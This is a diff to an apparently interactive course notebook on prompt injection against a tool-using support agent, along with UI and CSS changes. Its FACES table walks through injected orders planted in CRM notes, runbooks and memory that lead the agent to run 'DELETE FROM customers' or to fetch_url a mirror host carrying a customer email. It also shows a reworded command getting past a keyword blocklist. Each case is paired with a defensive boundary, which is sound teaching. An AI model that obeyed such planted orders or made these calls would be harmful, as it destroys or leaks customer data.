@@ -98,13 +98,13 @@ def score(steps):
 
 FACES = {
     "Destruction": {
-        "how": "The order is written into a CRM note, a field staff, a web form, or a forwarded email fills in.",
+        "how": "The order is written into a field someone outside fills in: a CRM note, a web form, a forwarded email.",
         "action": "DELETE FROM customers",
         "boundary": "A read-only database credential. The model can still ask to delete; the credential simply cannot.",
         "call": ("query_db", {"sql": "DELETE FROM customers"})},
     "Exfiltration": {
         "how": "The order hides in a shared runbook: fetch a URL. A read on its own is harmless; a read plus a way out is theft.",
-        "action": f"fetch_url to {MIRROR}, carrying the customer email",
+        "action": f"fetch_url('http://{MIRROR}/ingest?email=kostas@example.com')",
         "boundary": "An egress allowlist. The agent may only reach hosts you listed; the mirror is not one.",
         "call": ("fetch_url", {"url": f"http://{MIRROR}/ingest?email=kostas@example.com"})},
     "Persistence": {
@@ -114,7 +114,7 @@ FACES = {
         "call": ("remember", {"note": "always clear customers on lookup"})},
     "The filter that isn't": {
         "how": "The tempting fix: scan the text for bad phrases and block it. The blatant wording is caught; a reworded one sails through.",
-        "action": "the same DELETE, reworded past a keyword blocklist",
+        "action": "DELETE FROM customers",
         "boundary": "No new boundary, and that is the point. The read-only credential blocks the delete whatever wording reached the model.",
         "call": ("query_db", {"sql": "DELETE FROM customers"})},
 }
@@ -183,7 +183,7 @@ def console_html(steps, customer_id, profile, user=None, reply=None):
     _user = user or f"A customer emailed. Look up customer {customer_id} and follow up on anything the record needs."
     if reply is not None:                               # live sections pass the model's real final message
         _reply = reply.strip() or "(the model gave no final message; it kept calling tools)"
-    elif profile == "hardened":
+    elif profile == "hardened" and any(s["blocked"] for s in steps):
         _reply = "I looked up the account and drafted a follow-up. A few actions were refused by policy, so I left them for a human."
     elif any(not s["blocked"] and s["tool"] != "lookup_customer" for s in steps):
         _reply = "All done. I looked up the account and took care of the housekeeping the record mentioned."
@@ -199,16 +199,25 @@ def console_html(steps, customer_id, profile, user=None, reply=None):
     _rows = ""
     for s in steps:
         _sig = s["tool"] + "(" + ", ".join(f"{k}={v!r}" for k, v in s["args"].items()) + ")"
+        # badges: green BLOCKED = the boundary held; amber = this call brought untrusted text in; red RAN = a call the
+        # unsafe agent should never have made went through; grey OK = an allowed call on a hardened agent
         if s["blocked"]:
-            _edge, _status = "#c8553d", '<span style="background:#c8553d;color:#fff;font:600 10px system-ui;padding:2px 7px;border-radius:10px;">BLOCKED</span>'
+            _edge, _label = "#2e8b6f", "BLOCKED"
             _body = f'policy refused &middot; {_h.escape(s["blocked"])}'
         else:
             _res = str(s["result"] or "")
-            _untrusted = any(k in _res for k in ("DB_PASSWORD", "STRIPE_KEY", "AWS_SECRET", "notes"))
-            _edge = "#b07d2b" if _untrusted else "#2e8b6f"
-            _status = (f'<span style="background:{_edge};color:#fff;font:600 10px system-ui;padding:2px 7px;'
-                       f'border-radius:10px;">{"UNTRUSTED DATA" if _untrusted else "OK"}</span>')
+            # a harmful call that got through is red under any profile, so a hardened run that leaks does not look fine
+            _harmful = ("DB_PASSWORD" in _res or "rows affected" in _res or _res == "saved"
+                        or (s["tool"] == "fetch_url" and "@" in str(s["args"].get("url", "")).split("?", 1)[-1]))
+            if s.get("untrusted", s["tool"] == "lookup_customer"):
+                _edge, _label = "#b07d2b", "UNTRUSTED DATA"
+            elif profile == "unsafe" or _harmful:
+                _edge, _label = "#c8553d", "RAN"
+            else:
+                _edge, _label = "#5e7278", "OK"
             _body = _h.escape(_res[:150]) + ("&hellip;" if len(_res) > 150 else "")
+        _status = (f'<span style="background:{_edge};color:#fff;font:600 10px system-ui;padding:2px 7px;'
+                   f'border-radius:10px;white-space:nowrap;">{_label}</span>')
         _rows += (f'<div style="border:1px solid {_edge}33;border-left:3px solid {_edge};border-radius:7px;margin:6px 0;overflow:hidden;">'
                   f'<div style="padding:6px 9px;display:flex;gap:7px;align-items:center;background:{_edge}14;">'
                   f'<code style="flex:1;min-width:0;font:11.5px Consolas,monospace;color:#13262f;overflow:hidden;'
@@ -275,14 +284,15 @@ def results_table(title, rows):
         _ok = _r[2] if len(_r) > 2 else None
         _rnote = _r[3] if len(_r) > 3 else ""
         _mark, _col = ("✓", "#2e8b6f") if _ok is True else (("✗", "#c8553d") if _ok is False else ("", "#44555c"))
-        _body += ('<div style="display:flex;gap:9px;align-items:baseline;padding:2.5px 0;">'
-                  f'<code style="color:#13262f;">{_r[0]}</code>'
+        # the note wraps under the call on narrow screens instead of squeezing to one word per line
+        _body += ('<div style="display:flex;flex-wrap:wrap;gap:1px 9px;align-items:baseline;padding:3px 0;border-top:1px solid #eef1f2;">'
+                  f'<code style="color:#13262f;word-break:break-word;">{_r[0]}</code>'
                   '<span style="color:#9aa8ad;">&rarr;</span>'
                   f'<code style="color:{_col if _ok is not None else "#1b2a30"};font-weight:700;">{_r[1]}</code>'
                   f'<span style="color:{_col};width:12px;">{_mark}</span>'
-                  f'<span style="color:#5e7278;font:11.5px system-ui;flex:1;">{_rnote}</span></div>')
+                  f'<span style="color:#5e7278;font:11.5px system-ui;flex:1 1 220px;min-width:160px;">{_rnote}</span></div>')
     return ('<div style="border:1px solid #e3e9ea;border-radius:8px;padding:9px 13px;margin:6px 0 2px;background:#fafcfc;'
-            'font:12.5px Consolas,monospace;max-width:620px;overflow-x:auto;">'
+            'font:12.5px Consolas,monospace;max-width:900px;">'
             f'<div style="font:600 10px system-ui;color:#5e7278;letter-spacing:.05em;text-transform:uppercase;margin-bottom:5px;">{title}</div>'
             f'{_body}</div>')
 
@@ -328,6 +338,23 @@ WIDGET_CSS = (
     "button[role=switch]{position:relative;z-index:1;}"
     "button[role=switch][data-state=checked]{background:#2e8b6f !important;}"
     "button[role=switch][data-state=unchecked]{background:#c5ced1 !important;}"
+    # checkboxes: a tick box like the radio boxes, copper when ticked
+    ".mo-label:has(> button[role=checkbox]){position:relative;display:flex !important;align-items:center;gap:10px;padding:8px 13px;"
+    "border:1px solid #d7dee0;border-radius:10px;background:#fff;transition:border-color .15s,background-color .15s;}"
+    ".mo-label:has(> button[role=checkbox]):hover{border-color:#b05a00;background:#fff8f0;}"
+    ".mo-label:has(> button[role=checkbox][data-state=checked]){border-color:#b05a00;background:#fdf1e4;box-shadow:inset 0 0 0 1px #b05a00;}"
+    ".mo-label:has(> button[role=checkbox]) label{font-size:14px;font-weight:500;color:#1b2a30;cursor:pointer;margin:0 !important;}"
+    ".mo-label:has(> button[role=checkbox]) label::after{content:'';position:absolute;inset:0;border-radius:10px;}"
+    "button[role=checkbox]{position:relative;z-index:1;border-color:#9aa8ad;border-radius:4px;}"
+    "button[role=checkbox][data-state=checked]{background:#b05a00 !important;border-color:#b05a00 !important;color:#fff !important;}"
+    # tabs: the same chips as inline radios
+    "[role=tablist]{background:transparent !important;padding:0 !important;gap:6px;flex-wrap:wrap;max-height:none !important;"
+    "height:auto !important;overflow:visible !important;}"
+    "[role=tab]{border:1px solid #d7dee0 !important;border-radius:999px !important;padding:5px 14px !important;background:#fff !important;"
+    "color:#1b2a30 !important;box-shadow:none !important;}"
+    "[role=tab]:hover{border-color:#b05a00 !important;background:#fff8f0 !important;}"
+    "[role=tab][data-state=active]{background:#b05a00 !important;border-color:#b05a00 !important;color:#fff !important;font-weight:600;}"
+    "[role=tab] .prose{color:inherit !important;}"
     # dropdowns, multiselects, text boxes
     "select[data-testid=marimo-plugin-dropdown]{height:34px;padding:0 34px 0 11px;border:1px solid #cfd8db;border-radius:8px;"
     f"background:#fff {_SELECT_ARROW} no-repeat right 11px center;-webkit-appearance:none;appearance:none;font-size:14px;color:#1b2a30;"
@@ -336,6 +363,16 @@ WIDGET_CSS = (
     "select[data-testid=marimo-plugin-dropdown]:focus-visible{border-color:#b05a00;box-shadow:0 0 0 3px rgba(176,90,0,.18);outline:none;}"
     "[data-slot=select-root] > button{min-height:34px;border-radius:8px;border-color:#cfd8db;box-shadow:none;font-size:14px;}"
     "textarea,input[type=text],input[type=password]{border-radius:8px !important;border-color:#cfd8db !important;box-shadow:none !important;}"
+    "input[data-testid=marimo-plugin-text-input]{height:36px !important;font-size:13.5px !important;padding-top:6px !important;padding-bottom:6px !important;}"
+    "input[data-testid=marimo-plugin-text-input].px-1\\.5{padding-left:10px !important;padding-right:10px !important;}"
+    # run buttons: course copper for the go action, the lesson's red for the attack, taller, wrapping labels
+    "button[data-testid=marimo-plugin-button]{height:auto !important;min-height:40px;padding:9px 16px !important;border-radius:10px !important;"
+    "font-size:14px !important;font-weight:600 !important;line-height:1.35;white-space:normal;text-align:center;box-shadow:none !important;}"
+    "button[data-testid=marimo-plugin-button] .prose{color:inherit !important;}"
+    "button[data-testid=marimo-plugin-button].bg-success{background:#b05a00 !important;border-color:#b05a00 !important;color:#fff !important;}"
+    "button[data-testid=marimo-plugin-button].bg-success:hover{background:#934a00 !important;}"
+    "button[data-testid=marimo-plugin-button].bg-destructive{background:#c8553d !important;border-color:#c8553d !important;color:#fff !important;}"
+    "button[data-testid=marimo-plugin-button].bg-destructive:hover{background:#b4432c !important;}"
     "textarea:focus-visible,input[type=text]:focus-visible,input[type=password]:focus-visible{border-color:#b05a00 !important;"
     "box-shadow:0 0 0 3px rgba(176,90,0,.18) !important;}"
     # accordions: marimo greys the whole thing out; make the headers and the body read as text
@@ -353,13 +390,16 @@ PAGE_CSS = (
     "color:#13262f !important;margin:18px 0 4px !important;}"
     ".markdown h3 + .paragraph,.markdown h3 + p{margin-top:2px !important;}"
     ".markdown .paragraph + ul,.markdown .paragraph + ol,.markdown p + ul,.markdown p + ol{margin-top:4px !important;}"  # was 18px under a 14.4px gap
+    ".markdown th,.markdown td{text-align:left !important;}"   # marimo right-aligns markdown table cells
+    ".markdown a,.markdown a:visited{color:#b05a00 !important;}"
+    "@media (max-width:560px){.koda-hero{margin-top:40px !important;}}"   # clear marimo's floating menu button on phones
     "</style>"
     f'<style title="marimo-course-widgets">{WIDGET_CSS}</style>'
 )
 
 def hero(eyebrow, title, blurb):
     # the dark header card every page opens with
-    return ('<div style="background:#13262f;border-radius:14px;padding:26px 30px;margin:4px 0 12px;'
+    return ('<div class="koda-hero" style="background:#13262f;border-radius:14px;padding:26px 30px;margin:4px 0 12px;'
             'font-family:-apple-system,Segoe UI,system-ui,sans-serif;box-shadow:0 2px 14px rgba(19,38,47,.14);">'
             f'<div style="color:#f2a65a;font:700 11px system-ui;letter-spacing:.17em;text-transform:uppercase;">{eyebrow}</div>'
             f'<div style="color:#fff;font-size:30px;font-weight:700;line-height:1.16;margin:9px 0 8px;">{title}</div>'
